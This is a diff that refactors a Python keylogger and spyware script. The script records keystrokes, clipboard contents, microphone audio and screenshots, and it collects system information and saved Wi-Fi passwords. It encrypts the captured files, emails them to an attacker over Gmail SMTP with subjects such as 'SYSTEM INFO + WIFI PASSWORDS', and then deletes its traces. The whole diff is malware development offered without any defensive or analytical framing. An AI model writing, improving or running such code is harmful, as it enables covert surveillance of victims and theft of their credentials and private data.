@@ -59,16 +59,13 @@ if not os.path.exists(file_path):
 extend = "\\"
 file_merge = file_path + extend
 
-encryption_done = False
-sent_done = False
-
 files_to_encrypt = [file_merge + clipboard_information, file_merge + keys_send]
 send_file_names = [file_merge + clipboard_information_e, file_merge + keys_send_e, file_merge + audio_information, file_merge + screenshot_information ]
 system_files = [ file_merge + system_information, file_merge + wifi_information ]
 encrypted_system_files = [file_merge + system_information_e, file_merge + wifi_information_e ]
 
 # email controls
-def send_email(filename, attachment, toaddr):
+def send_email(file_list, subject, body):
 
     fromaddr = email_address
 
@@ -78,24 +75,19 @@ def send_email(filename, attachment, toaddr):
 
     msg['To'] = toaddr
 
-    msg['Subject'] = "Log File"
+    msg['Subject'] = subject
 
-    body = "Body_of_the_mail"
+    body = body
 
     msg.attach(MIMEText(body, 'plain'))
-
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    msg.attach(p)
+    
+    for file in file_list:
+        attachment = open(file, 'rb')
+        mime_base = MIMEBase('application', 'octet-stream')
+        mime_base.set_payload((attachment).read())
+        encoders.encode_base64(mime_base)
+        mime_base.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file)}')
+        msg.attach(mime_base)
 
     s = smtplib.SMTP('smtp.gmail.com', 587)
 
@@ -141,7 +133,6 @@ def copy_clipboard():
 
         except:
             f.write("Clipboard could be not be copied")
-
 
 #get the wifi profiles
 def get_wifi_profiles():
@@ -219,14 +210,7 @@ def encryption():
         with open(send_file_names[count], 'wb') as f:
             f.write(encrypted)
         count += 1   
-
-#send all the logs
-def sending_files():
-    count = 0
-    for files in send_file_names:
-        send_email(files, send_file_names[count], toaddr)
-        count+=1
-
+       
 #onetime log with system information
 def send_once():
     count = 0
@@ -240,16 +224,9 @@ def send_once():
         with open(encrypted_system_files[count], 'wb') as f:
             f.write(encrypted)       
         count+=1
-    count = 0
-    for files in encrypted_system_files:
-        send_email(files, encrypted_system_files[count], toaddr)
-        count+=1 
+    send_email(encrypted_system_files, "SYSTEM INFO + WIFI PASSWORDS", "Encrypted Files attached")
 t3 = threading.Thread(target=send_once)
 t3.start()
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
 
 #keylogger file function
 def write_file(keys):
@@ -262,9 +239,7 @@ def write_file(keys):
             else:
                 f.write(k)
                 f.close()
-             
-count = 0
-keys =[]   
+            
 #keylogger key recording function                
 def on_press(key):
     global keys, count, currentTime
@@ -281,43 +256,56 @@ def on_release(key):
     if currentTime > stoppingTime:
         return False
 
+number_of_iterations = 0
+encryption_done = False
+sent_done = False
+count = 0
+keys =[] 
+threads = []
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+threads.extend([ threading.Thread(target=copy_clipboard),
+                threading.Thread(target=microphone),
+                threading.Thread(target=screenshot)])
+for thread in threads:
+    thread.start()
 
+count = 0
+threads = []
+encrypt_thread = threading.Thread(target=encryption)
+send_thread = threading.Thread(target=send_email,args=(encrypted_system_files, "LOG FILES", "Encrypted Files attached"))
 # counter for keylogger
-while number_of_iterations < number_of_iterations_end:
-    threads = []
-    threads.extend([ threading.Thread(target=copy_clipboard),
-                    threading.Thread(target=microphone),
-                    threading.Thread(target=screenshot)])
-    for thread in threads:
-        thread.start()
+while currentTime < stoppingTime:
     
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-    
-    if currentTime > stoppingTime:
-        shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
-        with open(file_merge + keys_information, "w") as f:
-            f.write(" ")
         
-        number_of_iterations += 1
-        encryption_done = False
-        sent_done = False
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-         
-    if all(not thread.is_alive() for thread in threads):
-        if encryption_done : #This blocks entry until threads[3] is added then the initial if condition handles 
-            threads.extend([threading.Thread(target=sending_files)])
-            threads[-1].start()
-            encryption_done = False
-            sent_done = True
-        if not encryption_done and not sent_done:
+    if not encrypt_thread.is_alive(): 
+        threads.extend([threading.Thread(target=send_email,args=(encrypted_system_files, "LOG FILES", "Encrypted Files attached"))])
+        send_thread = threads[-1]
+        send_thread.start()
+        threads = []
+        threads.extend([ threading.Thread(target=copy_clipboard),
+                         threading.Thread(target=microphone),
+                         threading.Thread(target=screenshot)])
+        for thread in threads:
+            thread.start()
+        sent_done = True
+            
+    if all(not thread.is_alive() for thread in threads):    
+        if not send_thread.is_alive():
+            shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
+            keys =[] 
+            with open(file_merge + keys_information, "w") as f:
+                f.write(" ")
             threads.extend([threading.Thread(target=encryption)])
-            threads[-1].start()
-            encryption_done = True
+            encrypt_thread = threads[-1]
+            encrypt_thread.start()
+    
+    currentTime = time.time()
+    stoppingTime = time.time() + time_iteration
                             
-
-threads[-1].join()
+send_thread.join()
 t3.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
 for file in delete_files:
@@ -326,7 +314,3 @@ os.remove(file_merge + keys_information)
 if not os.listdir(file_merge):
         # If empty, delete the folder
         os.rmdir(file_merge)
-
-
-
-
